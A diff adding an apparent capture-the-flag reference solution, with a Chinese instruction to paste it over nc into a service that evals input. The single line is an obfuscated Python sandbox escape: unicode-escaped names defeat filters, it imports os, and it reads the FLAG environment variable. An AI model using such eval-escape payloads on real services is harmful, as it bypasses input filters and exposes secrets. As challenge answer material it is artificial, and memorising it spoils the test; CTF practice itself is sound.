@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr(getattr(globals()["\u005f\u005fbuiltins\u005f\u005f"], "\u005f\u005fi\u006dp\u006frt\u005f\u005f")("\u006fs"), "envi"+"ron")["FLAG"]
